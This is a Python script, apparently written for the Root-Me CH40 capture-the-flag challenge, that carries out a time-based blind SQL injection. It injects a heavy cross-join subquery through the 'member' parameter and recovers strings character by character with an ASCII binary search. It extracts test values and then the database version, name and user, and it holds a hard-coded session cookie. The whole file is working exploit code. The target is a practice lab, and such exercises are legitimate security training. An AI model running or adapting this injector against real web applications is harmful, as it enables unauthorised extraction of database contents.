#!/usr/bin/env python3
"""
SQL INJECTION TIME-BASED - ROOT-ME CH40
VERSIÓN 7 - PROBAR CON VALOR CONOCIDO
"""
import requests
import time
import statistics

URL = "http://challenge01.root-me.org/web-serveur/ch40/"
COOKIE = {"PHPSESSID": "fbf0fdc633505f66eef3f20808f0d1ce"}

class TimeBasedSQLInjector:
    def __init__(self):
        self.session = requests.Session()
        self.session.cookies.update(COOKIE)
        self.baseline = 29.48
        self.threshold = 31.48
        self.heavy = "(SELECT COUNT(*) FROM users, users T1)"
        self.debug = False
        
    def test_payload(self, payload, repeats=3):
        tiempos = []
        params = {"action": "member", "member": payload}
        for _ in range(repeats):
            inicio = time.perf_counter_ns()
            try:
                r = self.session.get(URL, params=params, timeout=5)
                tiempo = (time.perf_counter_ns() - inicio) / 1_000_000
                tiempos.append(tiempo)
            except:
                tiempos.append(0)
            time.sleep(0.05)
        return statistics.median(tiempos) if tiempos else 0
    
    def is_true(self, condition, repeats=3):
        payload = f"1 AND ({condition}) AND {self.heavy}"
        t = self.test_payload(payload, repeats=repeats)
        return t > self.threshold
    
    def extract_char(self, query, pos):
        low, high = 32, 126
        while low <= high:
            mid = (low + high) // 2
            cond = f"ASCII(SUBSTRING(({query}), {pos}, 1)) > {mid}"
            if self.is_true(cond, repeats=2):
                low = mid + 1
            else:
                high = mid - 1
        return chr(low)
    
    def extract_string(self, query, label="Extrayendo"):
        print(f"\n[*] {label}...")
        result = ""
        for pos in range(1, 20):  # Solo 20 caracteres para pruebas
            char = self.extract_char(query, pos)
            result += char
            print(f"  [{pos}] '{char}' (ASCII: {ord(char)})")
            if ord(char) == 0 or ord(char) == 32:  # NULL o espacio
                break
        return result

# EJECUCIÓN
injector = TimeBasedSQLInjector()

print("=" * 70)
print("  PROBANDO CON VALORES CONOCIDOS")
print("=" * 70)

# 1. Probar con un valor conocido: 'abc'
print("\n[1] Extrayendo 'abc' (debería ser 'a','b','c')")
result = injector.extract_string("SELECT 'abc'", "Valor 'abc'")
print(f"  Resultado: {result}")

# 2. Probar con un número conocido: 123
print("\n[2] Extrayendo '123' (debería ser '1','2','3')")
result = injector.extract_string("SELECT 123", "Valor 123")
print(f"  Resultado: {result}")

# 3. Probar con la versión (para ver si es legible)
print("\n[3] Extrayendo VERSION()")
result = injector.extract_string("SELECT VERSION()", "Versión")
print(f"  Resultado: {result}")

# 4. Probar con DATABASE()
print("\n[4] Extrayendo DATABASE()")
result = injector.extract_string("SELECT DATABASE()", "Base de datos")
print(f"  Resultado: {result}")

# 5. Probar con USER()
print("\n[5] Extrayendo USER()")
result = injector.extract_string("SELECT USER()", "Usuario")
print(f"  Resultado: {result}")
